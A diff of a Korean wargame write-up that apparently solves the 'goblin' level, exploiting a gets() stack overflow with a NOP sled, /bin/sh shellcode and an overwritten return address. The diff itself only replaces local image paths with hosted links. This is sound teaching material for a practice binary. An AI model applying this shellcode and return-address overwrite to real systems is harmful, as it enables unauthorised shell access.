@@ -10,13 +10,13 @@ PW : hacking exposed
 
 
 
-![1567948321473](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1567948321473.png)
+![1567948321473](https://user-images.githubusercontent.com/52530785/64917391-fd077200-d7ca-11e9-9681-cf1d347c96e6.png)
 
 
 
 파일 목록을 보면
 
-![1567948350031](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1567948350031.png)
+![1567948350031](https://user-images.githubusercontent.com/52530785/64917392-fd077200-d7ca-11e9-86d4-876c3b120a69.png)
 
 다음과 같이 있다.
 
@@ -26,19 +26,19 @@ PW : hacking exposed
 vi goblin.c 	명령어를 통해 코드를 확인해본다.
 ```
 
-![1567948638015](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1567948638015.png)
+![1567948638015](https://user-images.githubusercontent.com/52530785/64917393-fda00880-d7ca-11e9-8a13-735f31d06f1e.png)
 
 
 
 버퍼가 16바이트이고 이번엔 strcpy가 아니라 gets로 buffer에 입력 받아서 출력한다.
 
-![1567948814259](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1567948814259.png)
+![1567948814259](https://user-images.githubusercontent.com/52530785/64917394-fda00880-d7ca-11e9-8307-42eb1ffbe57d.png)
 
 
 
 여기서도 buffer 크기 + SFP 크기인 20글자를 입력하면 segmentation fault 가 뜬다.
 
-![1567948975295](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1567948975295.png)
+![1567948975295](https://user-images.githubusercontent.com/52530785/64917395-fda00880-d7ca-11e9-8317-b177966ba1a6.png)
 
 
 
@@ -48,13 +48,13 @@ vi goblin.c 	명령어를 통해 코드를 확인해본다.
 python -c 'print "a"*100' | ./goblin
 ```
 
-![1567949406268](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1567949406268.png)
+![1567949406268](https://user-images.githubusercontent.com/52530785/64917396-fda00880-d7ca-11e9-8105-802ec1f7557e.png)
 
 
 
 a가 100개가 들어가도 segmentation fault가 뜨진 않지만 실제로는 fault가 났다.
 
-![1567950186314](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1567950186314.png)
+![1567950186314](https://user-images.githubusercontent.com/52530785/64917397-fe389f00-d7ca-11e9-8cfd-fef5b5a0c266.png)
 
 core 파일이 생겼다.
 
@@ -72,7 +72,7 @@ python -c 'print "b"*20+"\x61\x61\x61\x61"' | ./goblin `python -c 'print "\x90"*
 gdb -c core		명령어를 실행한다.
 ```
 
-![1567951343506](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1567951343506.png)
+![1567951343506](https://user-images.githubusercontent.com/52530785/64917399-fe389f00-d7ca-11e9-801b-3be76fa52dba.png)
 
 앞부분에 python -c 'print "b"*20+"\x61\x61\x61\x61"' 로 준게 잘 들어가서 eip가 
 
@@ -84,7 +84,7 @@ gdb -c core		명령어를 실행한다.
 x/100wx $esp+300	명령어를 통해 메모리를 본다.
 ```
 
-![1567951450569](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1567951450569.png)
+![1567951450569](https://user-images.githubusercontent.com/52530785/64917400-fe389f00-d7ca-11e9-871c-424a21fc8fd2.png)
 
 쉘코드의 위치를 볼 수 있다. 
 
@@ -106,7 +106,7 @@ goblin의 argv에는 쉘코드를 준다.
 (python -c 'print "b"*20+"\xfc\xfb\xff\xbf"';cat) | ./goblin `python -c 'print "\x90"*215+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
 ```
 
-![1567951716240](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1567951716240.png)
+![1567951716240](https://user-images.githubusercontent.com/52530785/64917388-fd077200-d7ca-11e9-9040-f358a5796863.png)
 
 쉘이 떴다.
 
@@ -114,6 +114,6 @@ goblin의 argv에는 쉘코드를 준다.
 
 이제 main 디렉터리로 와서 POC를 실행한다.
 
-![1567951789993](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1567951789993.png)
+![1567951789993](https://user-images.githubusercontent.com/52530785/64917390-fd077200-d7ca-11e9-9c79-3c56c573983b.png)
 
 암호가 떴다.
